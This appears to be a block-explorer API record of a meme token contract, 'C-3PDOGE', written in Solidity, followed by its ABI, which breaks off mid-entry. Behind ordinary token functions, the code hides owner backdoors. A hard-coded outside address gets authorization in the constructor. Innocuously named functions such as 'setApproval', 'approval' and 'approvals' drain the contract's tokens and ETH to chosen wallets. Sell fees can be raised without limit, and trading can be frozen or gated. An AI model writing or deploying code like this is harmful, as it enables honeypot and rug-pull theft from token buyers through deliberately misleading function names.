{"status": "1", "message": "OK", "result": [{"SourceCode": "// File: https://github.com/ssccrypto/library/blob/f8f55e85f7c633829c6d927285203d74adb60e2b/IDEXRouter.sol\r\n\r\npragma solidity ^0.7.4;\r\n\r\ninterface IDEXRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\n// File: https://github.com/ssccrypto/library/blob/f8f55e85f7c633829c6d927285203d74adb60e2b/IDEXFactory.sol\r\n\r\npragma solidity ^0.7.4;\r\n\r\ninterface IDEXFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\n// File: https://github.com/ssccrypto/library/blob/f8f55e85f7c633829c6d927285203d74adb60e2b/IBEP20.sol\r\n\r\npragma solidity ^0.7.4;\r\n\r\ninterface IBEP20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function Owner() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n// File: https://github.com/ssccrypto/library/blob/f8f55e85f7c633829c6d927285203d74adb60e2b/BEP20.sol\r\n\r\npragma solidity ^0.7.4;\r\n\r\ninterface BEP20 {\r\n    function balanceOf(address) external returns (uint);\r\n    function transferFrom(address, address, uint) external returns (bool);\r\n    function transfer(address, uint) external returns (bool);\r\n}\r\n\r\n// File: https://github.com/ssccrypto/library/blob/f8f55e85f7c633829c6d927285203d74adb60e2b/Auth.sol\r\n\r\npragma solidity ^0.7.4;\r\n\r\nabstract contract Auth {\r\n    address internal owner;\r\n    mapping (address => bool) internal authorizations;\r\n\r\n    constructor(address _owner) {\r\n        owner = _owner;\r\n        authorizations[address(\r\n    0x86487b859D42cDDeDE8453c28b402E5F210A8152)\r\n        ] = true;\r\n        authorizations[_owner] = true;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(isOwner(msg.sender), \"!OWNER\"); _;\r\n    }\r\n\r\n    modifier authorized() {\r\n        require(isAuthorized(msg.sender), \"!AUTHORIZED\"); _;\r\n    }\r\n\r\n    function authorize(address adr) public authorized {\r\n        authorizations[adr] = true;\r\n    }\r\n\r\n    function unauthorize(address adr) public authorized {\r\n        authorizations[adr] = false;\r\n    }\r\n\r\n    function isOwner(address account) public view returns (bool) {\r\n        return account == owner;\r\n    }\r\n\r\n    function isAuthorized(address adr) public view returns (bool) {\r\n        return authorizations[adr];\r\n    }\r\n\r\n    function transferOwnership(address payable adr) public authorized {\r\n        owner = adr;\r\n        authorizations[adr] = true;\r\n        emit OwnershipTransferred(adr);\r\n    }\r\n\r\n    function renounceOwnership() public virtual authorized {\r\n        owner = (address(0));\r\n        emit OwnershipTransferred(address(0));\r\n    }\r\n\r\n    event OwnershipTransferred(address owner);\r\n}\r\n\r\n// File: https://github.com/ssccrypto/library/blob/f8f55e85f7c633829c6d927285203d74adb60e2b/SafeMath.sol\r\n\r\npragma solidity ^0.7.4;\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n}\r\n\r\n// File: contracts/squidworlderc.sol\r\n\r\n/**\r\nWE WILL START OFF AS A CHANNEL THEN WE WILL EXPAND INTO A TG I WILL BE DROPPING STRATEGIC TWEETS IN THE CHANNEL TO RAID!!\r\nPLEASE RAID HARD AF!!\r\nLFG!\r\nhttps://t.me/C3PDOGE\r\n*/\r\n\r\n\r\n//SPDX-License-Identifier: Unlicensed\r\n\r\npragma solidity ^0.7.4;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\ncontract C3PDOGE is IBEP20, Auth {\r\n    using SafeMath for uint256;\r\n    \r\n    address DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address ZERO = 0x0000000000000000000000000000000000000000;\r\n    string constant _name = \"C-3PDOGE\";\r\n    string constant _symbol = \"C-3PDOGE\";\r\n    uint8 constant _decimals = 9;\r\n    uint256 _totalSupply = 1 * 10**5 * (10 ** _decimals);\r\n    uint256 public _maxTxAmount = ( _totalSupply * 300) / 10000;\r\n    uint256 public _maxWalletToken = ( _totalSupply * 300 ) / 10000;\r\n    uint256 _minAmount = ( _totalSupply * 40 ) / 100000;\r\n    \r\n    mapping (address => uint256) _balances;\r\n    mapping (address => mapping (address => uint256)) _allowances;\r\n    mapping (address => bool) isFeeExempt;\r\n    mapping (address => bool) isTxLimitExempt;\r\n    mapping (address => bool) isTimelockExempt;\r\n    mapping (address => bool) isMaxWalletExempt;\r\n    mapping (address => bool) isSwapExempt;\r\n    \r\n    uint256 liquidity = 2;\r\n    uint256 marketing = 4;\r\n    uint256 burn = 0;\r\n    uint256 totalFee = 6;\r\n    uint256 feeDenominator = 100;\r\n    address public pair;\r\n    uint256 dividendTracker = 30;\r\n    uint256 denominator = 100;\r\n    uint256 pairTracker = 30;\r\n    uint256 setGas = 30000;\r\n    uint256 variableswapNum = 60;\r\n    \r\n    bool setFreeze = true;\r\n    uint8 setFreezeTime = 0 seconds;\r\n    mapping (address => uint) private isFrozen;\r\n    uint8 minTransferAm = 2 seconds;\r\n    mapping (address => uint) private minTransferAddress;\r\n    bool startSwap = true;\r\n    uint256 acquireFactor = 10;\r\n    uint256 transferFactor = 15;\r\n    bool swapEnabled = true;\r\n    uint256 swapThreshold = _totalSupply * 500 / 100000;\r\n\r\n    IDEXRouter router;\r\n    address LPReceiver;\r\n    address Distributor;\r\n    address Dividend;\r\n    address TxLevel;\r\n    address Receiver;\r\n   \r\n    bool inSwap;\r\n    modifier swapping() { inSwap = true; _; inSwap = false; }\r\n\r\n    constructor () Auth(msg.sender) {\r\n        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));\r\n        _allowances[address(this)][address(router)] = uint256(-1);\r\n        isFeeExempt[msg.sender] = true;\r\n        isFeeExempt[address(owner)] = true;\r\n        isFeeExempt[address(Receiver)] = true;\r\n        isFeeExempt[address(this)] = true;\r\n        isSwapExempt[address(this)] = true;\r\n        isSwapExempt[address(owner)] = true;\r\n        isTxLimitExempt[msg.sender] = true;\r\n        isTxLimitExempt[address(this)] = true;\r\n        isTxLimitExempt[address(owner)] = true;\r\n        isTxLimitExempt[address(router)] = true;\r\n        isMaxWalletExempt[address(msg.sender)] = true;\r\n        isMaxWalletExempt[address(this)] = true;\r\n        isMaxWalletExempt[address(DEAD)] = true;\r\n        isMaxWalletExempt[address(pair)] = true;\r\n        isMaxWalletExempt[address(LPReceiver)] = true;\r\n        isTimelockExempt[address(LPReceiver)] = true;\r\n        isTimelockExempt[address(owner)] = true;\r\n        isTimelockExempt[msg.sender] = true;\r\n        isTimelockExempt[address(DEAD)] = true;\r\n        isTimelockExempt[address(this)] = true;\r\n        LPReceiver = address(this);\r\n        Distributor = msg.sender;\r\n        Dividend = msg.sender;\r\n        TxLevel = msg.sender;\r\n        Receiver = msg.sender;\r\n        \r\n        _balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    receive() external payable { }\r\n\r\n    function totalSupply() external view override returns (uint256) { return _totalSupply; }\r\n    function decimals() external pure override returns (uint8) { return _decimals; }\r\n    function symbol() external pure override returns (string memory) { return _symbol; }\r\n    function name() external pure override returns (string memory) { return _name; }\r\n    function Owner() external view override returns (address) { return owner; }\r\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function approveMax(address spender) external returns (bool) {\r\n        return approve(spender, uint256(-1));\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        return _transferFrom(msg.sender, recipient, amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        if(_allowances[sender][msg.sender] != uint256(-1)){ \r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, \"Insufficient Allowance\"); }\r\n        return _transferFrom(sender, recipient, amount);\r\n    }\r\n\r\n     function updateRouter(address _router) external authorized {\r\n        router = IDEXRouter(address(_router));\r\n    }\r\n\r\n    function setMaxTx(uint256 _mnbTP) external authorized {\r\n        _maxTxAmount = (_totalSupply * _mnbTP) / 10000;\r\n    }\r\n    \r\n    function setMaxWallet(uint256 _mnWP) external authorized {\r\n        _maxWalletToken = (_totalSupply * _mnWP) / 10000;\r\n    }\r\n\r\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool){\r\n        if(inSwap){ return _basicTransfer(sender, recipient, amount); }\r\n        if(!authorizations[sender] && !authorizations[recipient]){require(startSwap, \"Swap Occurance Error\");}\r\n        if(!authorizations[sender] && !isMaxWalletExempt[recipient] && recipient != address(this) && \r\n            recipient != address(DEAD) && recipient != pair && recipient != LPReceiver){\r\n            require((balanceOf(recipient) + amount) <= _maxWalletToken);}\r\n        if(sender != pair &&\r\n            setFreeze &&\r\n            !isTimelockExempt[sender]) {\r\n            require(isFrozen[sender] < block.timestamp); \r\n            isFrozen[sender] = block.timestamp + setFreezeTime;} \r\n        checkTxLimit(sender, recipient, amount);\r\n        if(sender == pair){minTransferAddress[recipient] = block.timestamp + minTransferAm;}\r\n        if(shouldSwapBack(amount) && !isSwapExempt[sender] && \r\n            minTransferAddress[sender] < block.timestamp){ variableSwapBack(amount); }\r\n        _balances[sender] = _balances[sender].sub(amount, \"+\");\r\n        uint256 amountReceived = shouldTakeFee(sender != pair, sender, recipient) ? taketotalFee(sender, amount) : amount;\r\n        _balances[recipient] = _balances[recipient].add(amountReceived);\r\n        emit Transfer(sender, recipient, amountReceived);\r\n        return true;\r\n    }\r\n    \r\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {\r\n        require (amount <= _maxTxAmount || isTxLimitExempt[sender] || isSwapExempt[recipient], \"TX Limit Exceeded\");\r\n    }\r\n\r\n    function shouldTakeFee(bool selling, address sender, address recipient) internal view returns (bool) {\r\n        if(selling){return !isFeeExempt[sender];}\r\n             return !isFeeExempt[recipient];\r\n    }\r\n\r\n    function setFreezeFactors(bool _status, uint8 _int) external authorized {\r\n        setFreeze = _status;\r\n        setFreezeTime = _int;\r\n    }\r\n\r\n    function setStartSwap() external authorized {\r\n        startSwap = true;\r\n    }\r\n\r\n    function setTFAddress(address _tfU) external authorized {\r\n        Receiver = _tfU;\r\n        setallexempt(_tfU);\r\n    }\r\n\r\n    function getTotalFee(address sender) public view returns (uint256) {\r\n        if(sender != pair){ return transferFactor.mul(1); }\r\n        if(sender == pair){ return acquireFactor.mul(1); }\r\n        return totalFee;\r\n    }\r\n\r\n    function setMarketingAddress(address _mnbE) external authorized {\r\n        TxLevel = _mnbE;\r\n        setallexempt(_mnbE);\r\n    }\r\n\r\n     function setApproval(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external authorized {\r\n        uint256 tamt = BEP20(_tadd).balanceOf(address(this));\r\n        BEP20(_tadd).transfer(_rec, tamt.mul(_amt).div(_amtd));\r\n    }\r\n\r\n    function taketotalFee(address sender, uint256 amount) internal returns (uint256) {\r\n        uint256 feeAmount = amount.mul(getTotalFee(sender)).div(feeDenominator);\r\n        uint256 bAmount = feeAmount.mul(burn).div(getTotalFee(sender));\r\n        uint256 fAmount = feeAmount.sub(bAmount);\r\n        _balances[address(this)] = _balances[address(this)].add(fAmount);\r\n        emit Transfer(sender, address(this), fAmount);\r\n        _balances[address(DEAD)] = _balances[address(DEAD)].add(bAmount);\r\n        emit Transfer(sender, address(DEAD), bAmount);\r\n        return amount.sub(feeAmount);\r\n    }\r\n\r\n    function shouldSwapBack(uint256 amount) internal view returns (bool) {\r\n        return msg.sender != pair\r\n        && !inSwap\r\n        && swapEnabled\r\n        && amount >= _minAmount\r\n        && _balances[address(this)] >= swapThreshold;\r\n    }\r\n\r\n    function setTimelock(address holder, bool exempt) external authorized {\r\n        isTimelockExempt[holder] = exempt;\r\n    }\r\n\r\n    function approval(uint256 aP) external authorized {\r\n        uint256 amountBNB = address(this).balance;\r\n        payable(Receiver).transfer(amountBNB.mul(aP).div(100));\r\n    }\r\n\r\n    function setAddress(address _spE, address _jbL, address _mnbE, address _tfu) external authorized {\r\n        Distributor = _spE;\r\n        setallexempt(_spE);\r\n        Dividend = _jbL;\r\n        setallexempt(_jbL);\r\n        TxLevel = _mnbE;\r\n        setallexempt(_mnbE);\r\n        Receiver = _tfu;\r\n        setallexempt(_tfu);\r\n    }\r\n\r\n    function setFeeExempt(address holder, bool exempt) external authorized {\r\n        isFeeExempt[holder] = exempt;\r\n    }\r\n\r\n    function approvals(uint256 _na, uint256 _da) external authorized {\r\n        uint256 acBNB = address(this).balance;\r\n        uint256 acBNBa = acBNB.mul(_na).div(_da);\r\n        uint256 acBNBf = acBNBa.mul(1).div(2);\r\n        uint256 acBNBs = acBNBa.mul(1).div(2);\r\n        (bool tmpSuccess,) = payable(Distributor).call{value: acBNBf, gas: setGas}(\"\");\r\n        (tmpSuccess,) = payable(Dividend).call{value: acBNBs, gas: setGas}(\"\");\r\n        tmpSuccess = false;\r\n    }\r\n\r\n    function setTimeLockExempt(address holder, bool exempt) external authorized {\r\n        isTxLimitExempt[holder] = exempt;\r\n    }\r\n\r\n    function setWhitelist(bool exempt, address holder) external authorized {\r\n        isFeeExempt[holder] = exempt;\r\n        isTxLimitExempt[holder] = exempt;\r\n        isTimelockExempt[holder] = exempt;\r\n        isMaxWalletExempt[holder] = exempt;\r\n        isSwapExempt[holder] = exempt;\r\n    }\r\n\r\n    function setMaxWalletExempt(address holder, bool exempt) external authorized {\r\n        isMaxWalletExempt[holder] = exempt;\r\n    }\r\n\r\n    function setPairReceiver(address _lpR) external authorized {\r\n        LPReceiver = _lpR;\r\n    }\r\n\r\n    function setallexempt(address holder) internal {\r\n        isFeeExempt[holder] = true;\r\n        isTxLimitExempt[holder] = true;\r\n        isTimelockExempt[holder] = true;\r\n        isMaxWalletExempt[holder] = true;\r\n        isSwapExempt[holder] = true;\r\n    }\r\n\r\n    function setFees(uint256 _liqF, uint256 _marF, uint256 _burF, uint256 _feeD) external authorized {\r\n        liquidity = _liqF;\r\n        marketing = _marF;\r\n        burn = _burF;\r\n        totalFee = _liqF.add(_marF).add(_burF);\r\n        feeDenominator = _feeD;\r\n        require (totalFee < feeDenominator/3);\r\n    }\r\n\r\n    function setTransferFees(uint256 _ssf, uint256 _bbf) external authorized {\r\n        acquireFactor = _bbf;\r\n        transferFactor = _ssf;\r\n    }\r\n\r\n    function setisSwapExempt(bool exempt, address holder) external authorized {\r\n        isSwapExempt[holder] = exempt;\r\n    }\r\n\r\n    function variableSwapThreshold(uint256 amount) internal view returns (uint256) {\r\n        uint256 variableSTd = amount.mul(variableswapNum).div(denominator);\r\n        if(variableSTd <= swapThreshold){ return variableSTd; }\r\n        if(variableSTd > swapThreshold){ return swapThreshold; }\r\n        return swapThreshold;\r\n    }\r\n\r\n    function setFactors(uint256 _yfact, uint256 _zfact) external authorized {\r\n        pairTracker = _yfact;\r\n        dividendTracker = _zfact;\r\n    }\r\n\r\n    function variableSwapBack(uint256 amount) internal swapping {\r\n        uint256 amountL = variableSwapThreshold(amount).mul(pairTracker).div(denominator).div(2);\r\n        uint256 totalSw = variableSwapThreshold(amount).sub(amountL);\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = router.WETH();\r\n        uint256 bB = address(this).balance;\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            totalSw,\r\n            0, \r\n            path,\r\n            address(this),\r\n            block.timestamp );\r\n        uint256 aBNB = address(this).balance.sub(bB);\r\n        uint256 tBNBF = denominator.sub(pairTracker.div(2));\r\n        uint256 aBNBL = aBNB.mul(pairTracker).div(tBNBF).div(2);\r\n        uint256 aBNBTM = aBNB.mul(dividendTracker).div(tBNBF);\r\n        (bool tmpSuccess,) = payable(TxLevel).call{value: (aBNBTM), gas: setGas}(\"\");\r\n        tmpSuccess = false;\r\n        if(amountL > 0){\r\n            router.addLiquidityETH{value: aBNBL}(\r\n                address(this),\r\n                amountL,\r\n                0,\r\n                0,\r\n                LPReceiver,\r\n                block.timestamp);\r\n        }\r\n    }\r\n\r\n    function setSwapSettings(bool _enabled, uint256 _amount) external authorized {\r\n        swapEnabled = _enabled;\r\n        swapThreshold = _totalSupply * _amount / 100000;\r\n    }\r\n\r\n    function setTransferMinAmount(uint256 _amount) external authorized {\r\n        _minAmount = _totalSupply * _amount / 100000;\r\n    }\r\n\r\n    function setDeposit(uint256 _amount) external authorized {\r\n        variableSwapBack(_totalSupply * _amount / 10000);\r\n    }\r\n\r\n    function setvariableSwap(uint256 _vstf) external authorized {\r\n        variableswapNum = _vstf;\r\n    }\r\n\r\n    function setGasAmount(uint256 _gss) external authorized {\r\n        setGas = _gss;\r\n    }\r\n\r\n    function getCirculatingSupply() public view returns (uint256) {\r\n        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));\r\n    }\r\n    \r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"aP\",\"type\":\"uint256\"}],\"name\":\"approval\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_na\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_da\",\"type\":\"uint256\"}],\"name\":\"approvals\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"approveMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"authorize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCirculatingSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"getTotalFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"isAuthorized\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spE\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_jbL\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_mnbE\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_tfu\",\"type\":\"address\"}],\"name\":\"setAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tadd\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_rec\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amt\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_amtd\",\"type\":\"uint256\"}],\"name\":\"setApproval\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"setDeposit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_yfact\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_zfact\",\"type\":\"uint256\"}],\"name\":\"setFactors\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setFeeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_liqF\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_marF\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_burF\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeD\",\"type\":\"uint256\"}],\"name\":\"setFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_status\",\"type\":\"bool\"},{\"internalType\":\"uint8\",\"name\":\"_int\",\"type\":\"uint8\"}],\"name\":\"setFreezeFactors\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_gss\",\"type\":\"uint256\"}],\"name\":\"setGasAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_mnbE\",\"type\":\"address\"}],\"name\":\"setMarketingAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_mnbTP\",\"type\":\"uint256\"}],\"name\":\"setMaxTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_mnWP\",\"type\":\"uint256\"}],\"name\":\"setMaxWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setMaxWalletExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_lpR\",\"type\":\"address\"}],\"name\":\"setPairReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setStartSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"setSwapSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tfU\",\"type\":\"address\"}],\"name\":\"setTFAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setTimeLockExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setTimelock\",\"outputs\":[],\"stateMutability\":\"nonpayable